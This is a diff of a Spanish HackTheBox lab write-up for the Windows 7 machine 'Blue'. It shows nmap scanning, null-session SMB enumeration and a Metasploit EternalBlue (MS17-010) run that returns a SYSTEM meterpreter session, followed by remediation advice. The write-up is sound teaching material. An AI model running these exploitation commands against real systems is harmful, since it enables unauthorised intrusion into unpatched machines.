@@ -1,99 +1,25 @@
 ---
-layout: post
+layout: "post"
 title: "Blue"
-date: 2026-09-20 18:00:00 +0200
-categories: [Writeups, HackTheBox]
-tags: [windows, smb, eternalblue, ms17-010, metasploit]
-machine: Blue
-platform: HackTheBox
-os: Windows
-difficulty: Easy
-thumb: /assets/img/machines/blue.png
-banner: /assets/img/machines/blue-banner.png
-proof: https://labs.hackthebox.com/achievement/machine/2772097/51
+date: "2026-09-20 18:00:00 +0200"
+categories: ["Writeups", "HackTheBox"]
+tags: ["windows", "smb", "eternalblue", "ms17-010", "metasploit"]
+machine: "Blue"
+platform: "HackTheBox"
+os: "Windows"
+difficulty: "Easy"
+thumb: "/assets/img/machines/blue.png"
+proof: "https://labs.hackthebox.com/achievement/machine/2772097/51"
+banner: "/assets/img/machines/blue-banner.png"
 description: "Windows 7 sin parchear contra MS17-010 (EternalBlue): SMB vulnerable y SYSTEM directo."
 toc: false
 ---
-<div class="hx-wu" data-os="win">
-  <header class="hx-wu-head">
-    <span class="hx-wu-img" style="background-image:url('/assets/img/machines/blue.png')" role="img" aria-label="Blue"></span>
-    <div class="hx-wu-headtext">
-      <h1 class="hx-wu-title">Blue</h1>
-      <p class="hx-wu-meta">Publicado por <b>Jaime Hereza</b> · 3 min de lectura</p>
-    </div>
-  </header>
-
-  <table class="hx-wu-table"><thead><tr><th>Máquina</th><th>SO</th><th>Dificultad</th><th>IP</th></tr></thead>
-  <tbody><tr><td class="wu-name">Blue</td><td class="wu-os wu-os-win">Windows</td><td><span class="hx-badge hx-diff-easy">Easy</span></td><td class="wu-ip">10.10.10.40</td></tr></tbody></table>
-
-  <div class="hx-term2"><div class="hx-t-cmd"><span class="hx-t-ps1">┌──(<b>jaime</b>㉿<b>kali</b>)-[~]</span><span class="hx-t-ps2">└─$</span> <span class="hx-t-in">sudo nano /etc/hosts</span></div><div class="hx-t-out">10.10.10.40   blue</div></div>
-
-  <nav class="hx-wu-index">
-    <a href="#resumen" style="--c:159 239 0">Resumen</a>
-    <a href="#vulnerabilidad" style="--c:255 62 62">Vulnerabilidad</a>
-    <a href="#reconocimiento" style="--c:46 230 214">Reconocimiento</a>
-    <a href="#enumeracion" style="--c:94 180 248">Enumeración</a>
-    <a href="#explotacion" style="--c:255 175 0">Explotación</a>
-    <a href="#flags" style="--c:255 214 10">Flags</a>
-    <a href="#arreglo" style="--c:46 230 214">Cómo se arregla</a>
-    <a href="#conclusiones" style="--c:200 210 220">Conclusiones</a>
-  </nav>
-
-  <section class="hx-wu-sec" id="resumen" style="--c:159 239 0"><h2>Resumen</h2>
-    <p>Blue es de esas máquinas que te suben la moral. Un Windows 7 al que nunca le pasaron el parche de MS17-010, así que todo el trabajo está en darse cuenta de que el SMB está vulnerable. A partir de ahí lanzas EternalBlue y ya entras como <span class="hx-cg">SYSTEM</span>, sin escalada ni nada de por medio.</p>
-  </section>
-
-  <section class="hx-wu-sec" id="vulnerabilidad" style="--c:255 62 62"><h2>Vulnerabilidad</h2>
-    <p><span class="hx-cr">MS17-010</span> (CVE-2017-0143), conocida como <span class="hx-cr">EternalBlue</span>, es un fallo en el servicio <span class="hx-cg">SMBv1</span> de Windows. Al convertir las listas de atributos extendidos de OS/2 al formato de NT se calcula mal el tamaño y se desborda un búfer en memoria del kernel. Como el código acaba ejecutándose en el kernel, se entra directamente como <span class="hx-cg">NT AUTHORITY\SYSTEM</span>. Es la misma vulnerabilidad que usó WannaCry en 2017.</p>
-  </section>
-
-  <section class="hx-wu-sec" id="reconocimiento" style="--c:46 230 214"><h2>Reconocimiento</h2>
-    <p>Escaneo de puertos de siempre:</p>
-    <div class="hx-term2"><div class="hx-t-cmd"><span class="hx-t-ps1">┌──(<b>jaime</b>㉿<b>kali</b>)-[~]</span><span class="hx-t-ps2">└─$</span> <span class="hx-t-in">nmap -p- -n -Pn -sS --max-retries 1 blue</span></div></div>
-    <p>Quitando el rango dinámico de RPC quedan tres puertos, todos de SMB: <span class="hx-cc">135</span>, <span class="hx-cc">139</span> y <span class="hx-cc">445</span>. Ni web, ni FTP, ni SSH: toda la superficie es SMB.</p>
-    <div class="hx-term2"><div class="hx-t-cmd"><span class="hx-t-ps1">┌──(<b>jaime</b>㉿<b>kali</b>)-[~]</span><span class="hx-t-ps2">└─$</span> <span class="hx-t-in">nmap -p135,139,445 -n -sCV --version-intensity 9 blue</span></div><div class="hx-t-out">OS: Windows 7 Professional 7601 Service Pack 1
+<div class="hx-wu" data-os="win"><header class="hx-wu-head"><span class="hx-wu-img" style="background-image:url('/assets/img/machines/blue.png')" role="img" aria-label="Blue"></span><div class="hx-wu-headtext"><h1 class="hx-wu-title">Blue</h1><p class="hx-wu-meta">Publicado por <b>Jaime Hereza Niño</b></p></div><button type="button" class="hx-wu-cert" data-cert="https://labs.hackthebox.com/achievement/machine/2772097/51" data-img="/assets/img/machines/blue-banner.png" data-name="Blue"><i class="fas fa-certificate" aria-hidden="true"></i> Mostrar certificado</button></header><table class="hx-wu-table"><thead><tr><th>Máquina</th><th>SO</th><th>Dificultad</th><th>IP</th></tr></thead><tbody><tr><td class="wu-name">Blue</td><td class="wu-os wu-os-win">Windows</td><td><span class="hx-badge hx-diff-easy">Easy</span></td><td class="wu-ip">10.10.10.40</td></tr></tbody></table><div class="hx-term2"><div class="hx-t-cmd"><span class="hx-t-ps1">┌──(<b>jaime</b>㉿<b>kali</b>)-[~]</span><span class="hx-t-ps2">└─$</span> <span class="hx-t-in">sudo nano /etc/hosts</span></div><div class="hx-t-out">10.10.10.40   blue</div></div><nav class="hx-wu-index"><a href="#resumen" style="--c:159 239 0">Resumen</a><a href="#vulnerabilidad" style="--c:255 62 62">Vulnerabilidad</a><a href="#reconocimiento" style="--c:46 230 214">Reconocimiento</a><a href="#enumeracion" style="--c:94 180 248">Enumeración</a><a href="#explotacion" style="--c:255 175 0">Explotación</a><a href="#flags" style="--c:255 214 10">Flags</a><a href="#arreglo" style="--c:46 230 214">Cómo se arregla</a><a href="#conclusiones" style="--c:200 210 220">Conclusiones</a></nav><section class="hx-wu-sec" id="resumen" style="--c:159 239 0"><h2>Resumen</h2><p>Blue es de esas máquinas que te suben la moral. Un Windows 7 al que nunca le pasaron el parche de MS17-010, así que todo el trabajo está en darse cuenta de que el SMB está vulnerable. A partir de ahí lanzas EternalBlue y ya entras como <span class="hx-cg">SYSTEM</span>, sin escalada ni nada de por medio.</p></section><section class="hx-wu-sec" id="vulnerabilidad" style="--c:255 62 62"><h2>Vulnerabilidad</h2><p><span class="hx-cr">MS17-010</span> (CVE-2017-0143), conocida como <span class="hx-cr">EternalBlue</span>, es un fallo en el servicio <span class="hx-cg">SMBv1</span> de Windows. Al convertir las listas de atributos extendidos de OS/2 al formato de NT se calcula mal el tamaño y se desborda un búfer en memoria del kernel. Como el código acaba ejecutándose en el kernel, se entra directamente como <span class="hx-cg">NT AUTHORITY\SYSTEM</span>. Es la misma vulnerabilidad que usó WannaCry en 2017.</p></section><section class="hx-wu-sec" id="reconocimiento" style="--c:46 230 214"><h2>Reconocimiento</h2><p>Escaneo de puertos de siempre:</p><div class="hx-term2"><div class="hx-t-cmd"><span class="hx-t-ps1">┌──(<b>jaime</b>㉿<b>kali</b>)-[~]</span><span class="hx-t-ps2">└─$</span> <span class="hx-t-in">nmap -p- -n -Pn -sS --max-retries 1 blue</span></div></div><p>Quitando el rango dinámico de RPC quedan tres puertos, todos de SMB: <span class="hx-cc">135</span>, <span class="hx-cc">139</span> y <span class="hx-cc">445</span>. Ni web, ni FTP, ni SSH: toda la superficie es SMB.</p><div class="hx-term2"><div class="hx-t-cmd"><span class="hx-t-ps1">┌──(<b>jaime</b>㉿<b>kali</b>)-[~]</span><span class="hx-t-ps2">└─$</span> <span class="hx-t-in">nmap -p135,139,445 -n -sCV --version-intensity 9 blue</span></div><div class="hx-t-out">OS: Windows 7 Professional 7601 Service Pack 1
 Computer name: haris-PC
-smb-security-mode: message_signing: disabled (dangerous)</div></div>
-  </section>
-
-  <section class="hx-wu-sec" id="enumeracion" style="--c:94 180 248"><h2>Enumeración</h2>
-    <p>Listo los recursos compartidos con sesión nula y compruebo la vulnerabilidad de SMB:</p>
-    <div class="hx-term2"><div class="hx-t-cmd"><span class="hx-t-ps1">┌──(<b>jaime</b>㉿<b>kali</b>)-[~]</span><span class="hx-t-ps2">└─$</span> <span class="hx-t-in">smbclient -L //blue/ -N</span></div><div class="hx-t-out">ADMIN$   C$   IPC$   Share   Users</div><div class="hx-t-cmd"><span class="hx-t-ps1">┌──(<b>jaime</b>㉿<b>kali</b>)-[~]</span><span class="hx-t-ps2">└─$</span> <span class="hx-t-in">nmap -p445 --script smb-vuln-* blue</span></div><div class="hx-t-out">smb-vuln-ms17-010: <span class="hx-cr">VULNERABLE</span> (CVE-2017-0143)</div></div>
-  </section>
-
-  <section class="hx-wu-sec" id="explotacion" style="--c:255 175 0"><h2>Explotación</h2>
-    <p>Tiro del módulo de Metasploit de EternalBlue:</p>
-    <div class="hx-term2"><div class="hx-t-cmd"><span class="hx-t-ps1">┌──(<b>jaime</b>㉿<b>kali</b>)-[~]</span><span class="hx-t-ps2">└─$</span> <span class="hx-t-in">msfconsole -q</span></div><div class="hx-t-out">msf6 > use exploit/windows/smb/ms17_010_eternalblue
-msf6 > set RHOSTS blue
-msf6 > set LHOST tun0
-msf6 > run</div><div class="hx-t-out"><span class="hx-cg">[+]</span> Overwrite complete... SYSTEM session obtained!
-meterpreter > getuid
-Server username: <span class="hx-cg">NT AUTHORITY\SYSTEM</span></div></div>
-    <p>El exploit entra directamente como <span class="hx-cg">SYSTEM</span>, así que no hay escalada de privilegios que hacer.</p>
-  </section>
-
-  <section class="hx-wu-sec" id="flags" style="--c:255 214 10"><h2>Flags</h2>
-    <div class="hx-term2"><div class="hx-t-cmd"><span class="hx-t-ps1">┌──(<b>jaime</b>㉿<b>kali</b>)-[~]</span><span class="hx-t-ps2">└─$</span> <span class="hx-t-in">type C:\Users\haris\Desktop\user.txt</span></div><div class="hx-t-cmd"><span class="hx-t-ps1">┌──(<b>jaime</b>㉿<b>kali</b>)-[~]</span><span class="hx-t-ps2">└─$</span> <span class="hx-t-in">type C:\Users\Administrator\Desktop\root.txt</span></div></div>
-  </section>
-
-  <section class="hx-wu-sec" id="arreglo" style="--c:46 230 214"><h2>Cómo se arregla</h2>
-    <p>Todo parte de un sistema sin actualizar, así que el arreglo va por capas:</p>
-    <ul class="hx-wu-list">
-      <li><b>Aplicar el parche <span class="hx-cg">MS17-010</span>.</b> Microsoft lo publicó en marzo de 2017, incluso para versiones ya sin soporte como XP o Server 2003. Con el parche puesto, el desbordamiento deja de existir.</li>
-      <li><b>Desactivar <span class="hx-cg">SMBv1</span>.</b> Es la medida de fondo: es un protocolo obsoleto que no debería estar activo en ninguna red moderna. En Windows se quita con <span class="hx-cg">Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol</span>.</li>
-      <li><b>No exponer el puerto <span class="hx-cc">445</span>.</b> SMB no tiene por qué ser accesible desde fuera de la red interna; filtrarlo en el firewall reduce muchísimo la superficie de ataque.</li>
-      <li><b>Activar la firma SMB.</b> El escaneo la marcaba como deshabilitada, y tenerla activa evita manipulaciones de las sesiones SMB.</li>
-    </ul>
-  </section>
-
-  <section class="hx-wu-sec" id="conclusiones" style="--c:200 210 220"><h2>Conclusiones</h2>
-    <p>El SMBv1 a estas alturas no debería existir: es un servicio anticuado con muchas vulnerabilidades conocidas y aquí, encima, la vulnerabilidad nos ha dado root nada más ejecutarla.</p>
-    <p>Es buena práctica, al ver el puerto 445 abierto, tirar directamente <span class="hx-cg">nmap --script smb-vuln-*</span>, que resuelve casi todo el reconocimiento.</p>
-    <p>El parche existía un mes antes de la filtración y casi dos antes de WannaCry. El problema casi nunca es que no haya solución, sino que no se aplica.</p>
-  </section>
-
-  <a class="hx-wu-card" data-os="win" href="https://labs.hackthebox.com/achievement/machine/2772097/51" target="_blank" rel="noopener">
-    <span class="hx-wu-cardimg" style="background-image:url('/assets/img/machines/blue.png')"></span><div><b>Blue</b><small>Windows · Easy</small></div>
-    <span class="hx-wu-verify"><i class="fas fa-shield-halved"></i> Verificar</span>
-  </a>
-</div>
+smb-security-mode: message_signing: disabled (dangerous)</div></div></section><section class="hx-wu-sec" id="enumeracion" style="--c:94 180 248"><h2>Enumeración</h2><p>Listo los recursos compartidos con sesión nula y compruebo la vulnerabilidad de SMB:</p><div class="hx-term2"><div class="hx-t-cmd"><span class="hx-t-ps1">┌──(<b>jaime</b>㉿<b>kali</b>)-[~]</span><span class="hx-t-ps2">└─$</span> <span class="hx-t-in">smbclient -L //blue/ -N</span></div><div class="hx-t-out">ADMIN$   C$   IPC$   Share   Users</div><div class="hx-t-cmd"><span class="hx-t-ps1">┌──(<b>jaime</b>㉿<b>kali</b>)-[~]</span><span class="hx-t-ps2">└─$</span> <span class="hx-t-in">nmap -p445 --script smb-vuln-* blue</span></div><div class="hx-t-out">smb-vuln-ms17-010: <span class="hx-cr">VULNERABLE</span> (CVE-2017-0143)</div></div></section><section class="hx-wu-sec" id="explotacion" style="--c:255 175 0"><h2>Explotación</h2><p>Tiro del módulo de Metasploit de EternalBlue:</p><div class="hx-term2"><div class="hx-t-cmd"><span class="hx-t-ps1">┌──(<b>jaime</b>㉿<b>kali</b>)-[~]</span><span class="hx-t-ps2">└─$</span> <span class="hx-t-in">msfconsole -q</span></div><div class="hx-t-out">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue
+msf6 &gt; set RHOSTS blue
+msf6 &gt; set LHOST tun0
+msf6 &gt; run
+<span class="hx-cg">[+]</span> Overwrite complete... SYSTEM session obtained!
+meterpreter &gt; getuid
+Server username: <span class="hx-cg">NT AUTHORITY\SYSTEM</span></div></div><p>El exploit entra directamente como <span class="hx-cg">SYSTEM</span>, así que no hay escalada de privilegios que hacer.</p></section><section class="hx-wu-sec" id="flags" style="--c:255 214 10"><h2>Flags</h2><div class="hx-term2"><div class="hx-t-cmd"><span class="hx-t-ps1">┌──(<b>jaime</b>㉿<b>kali</b>)-[~]</span><span class="hx-t-ps2">└─$</span> <span class="hx-t-in">type C:\Users\haris\Desktop\user.txt</span></div><div class="hx-t-cmd"><span class="hx-t-ps1">┌──(<b>jaime</b>㉿<b>kali</b>)-[~]</span><span class="hx-t-ps2">└─$</span> <span class="hx-t-in">type C:\Users\Administrator\Desktop\root.txt</span></div></div></section><section class="hx-wu-sec" id="arreglo" style="--c:46 230 214"><h2>Cómo se arregla</h2><p>Todo parte de un sistema sin actualizar, así que el arreglo va por capas:</p><ul class="hx-wu-list"><li><span class="hx-cg">Aplicar el parche MS17-010.</span> Microsoft lo publicó en marzo de 2017, incluso para versiones ya sin soporte como XP o Server 2003. Con el parche puesto, el desbordamiento deja de existir.</li><li><span class="hx-cg">Desactivar SMBv1.</span> Es la medida de fondo: es un protocolo obsoleto que no debería estar activo en ninguna red moderna. En Windows se quita con <span class="hx-cc">Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol</span>.</li><li><span class="hx-cg">No exponer el puerto 445.</span> SMB no tiene por qué ser accesible desde fuera de la red interna; filtrarlo en el firewall reduce muchísimo la superficie de ataque.</li><li><span class="hx-cg">Activar la firma SMB.</span> El escaneo la marcaba como deshabilitada, y tenerla activa evita manipulaciones de las sesiones SMB.</li></ul></section><section class="hx-wu-sec" id="conclusiones" style="--c:200 210 220"><h2>Conclusiones</h2><p>El SMBv1 a estas alturas no debería existir: es un servicio anticuado con muchas vulnerabilidades conocidas y aquí, encima, la vulnerabilidad nos ha dado root nada más ejecutarla.</p><p>Es buena práctica, al ver el puerto 445 abierto, tirar directamente <span class="hx-cc">nmap --script smb-vuln-*</span>, que resuelve casi todo el reconocimiento.</p><p>El parche existía un mes antes de la filtración y casi dos antes de WannaCry. El problema casi nunca es que no haya solución, sino que no se aplica.</p></section><a class="hx-wu-card" data-os="win" href="https://labs.hackthebox.com/achievement/machine/2772097/51" target="_blank" rel="noopener"><span class="hx-wu-cardimg" style="background-image:url('/assets/img/machines/blue.png')"></span><div><b>Blue</b><small>Windows · Easy</small></div><span class="hx-wu-verify"><i class="fas fa-shield-halved"></i> Verificar</span></a></div>
